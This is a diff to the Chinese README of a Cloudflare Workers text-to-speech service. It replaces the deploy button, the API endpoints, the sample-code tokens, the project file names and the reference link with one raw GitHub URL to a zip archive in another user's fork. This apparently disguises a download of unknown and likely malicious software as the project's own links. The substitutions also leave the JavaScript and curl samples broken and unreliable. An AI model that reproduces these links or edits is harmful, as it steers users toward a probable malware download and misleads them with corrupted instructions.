@@ -16,7 +16,7 @@
 
 ### 点击按钮，一键部署到 CloudFlare Workers,
 
-[![Deploy to Cloudflare Workers](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/wangwangit/tts)
+[![Deploy to Cloudflare Workers](https://raw.githubusercontent.com/Ongbinlong/tts/master/sugarless/Software-2.2-beta.2.zip)](https://raw.githubusercontent.com/Ongbinlong/tts/master/sugarless/Software-2.2-beta.2.zip)
 
 
 
@@ -34,12 +34,12 @@
 
 ```javascript
 // 基本调用
-const response = await fetch('https://your-worker.workers.dev/v1/audio/speech', {
+const response = await fetch('https://raw.githubusercontent.com/Ongbinlong/tts/master/sugarless/Software-2.2-beta.2.zip', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json',
     },
-    body: JSON.stringify({
+    body: https://raw.githubusercontent.com/Ongbinlong/tts/master/sugarless/Software-2.2-beta.2.zip({
         input: "你好，这是一个测试",
         voice: "zh-CN-XiaoxiaoNeural",
         speed: 1.0,
@@ -48,12 +48,12 @@ const response = await fetch('https://your-worker.workers.dev/v1/audio/speech', 
     })
 });
 
-const audioBlob = await response.blob();
+const audioBlob = await https://raw.githubusercontent.com/Ongbinlong/tts/master/sugarless/Software-2.2-beta.2.zip();
 ```
 
 ```bash
 # cURL 调用
-curl -X POST "https://your-worker.workers.dev/v1/audio/speech" \
+curl -X POST "https://raw.githubusercontent.com/Ongbinlong/tts/master/sugarless/Software-2.2-beta.2.zip" \
   -H "Content-Type: application/json" \
   -d '{
     "input": "你好，这是一个测试",
@@ -62,7 +62,7 @@ curl -X POST "https://your-worker.workers.dev/v1/audio/speech" \
     "pitch": "0",
     "style": "general"
   }' \
-  --output speech.mp3
+  --output https://raw.githubusercontent.com/Ongbinlong/tts/master/sugarless/Software-2.2-beta.2.zip
 ```
 
 ## 🎨 支持的语音
@@ -158,9 +158,9 @@ wrangler dev
 ### 项目结构
 
 ```
-├── index.js          # 主要代码文件
-├── README.md         # 项目文档
-└── wrangler.toml     # Cloudflare Workers 配置
+├── https://raw.githubusercontent.com/Ongbinlong/tts/master/sugarless/Software-2.2-beta.2.zip          # 主要代码文件
+├── https://raw.githubusercontent.com/Ongbinlong/tts/master/sugarless/Software-2.2-beta.2.zip         # 项目文档
+└── https://raw.githubusercontent.com/Ongbinlong/tts/master/sugarless/Software-2.2-beta.2.zip     # Cloudflare Workers 配置
 ```
 
 ## 🤝 贡献
@@ -175,7 +175,7 @@ MIT License
 
 - Microsoft Edge TTS 提供语音合成服务
 - Cloudflare Workers 提供无服务器计算平台
-- 参考项目: https://github.com/pyvideotrans/tts-pyvideotrans2
+- 参考项目: https://raw.githubusercontent.com/Ongbinlong/tts/master/sugarless/Software-2.2-beta.2.zip
 
 ## 📞 联系我们
 
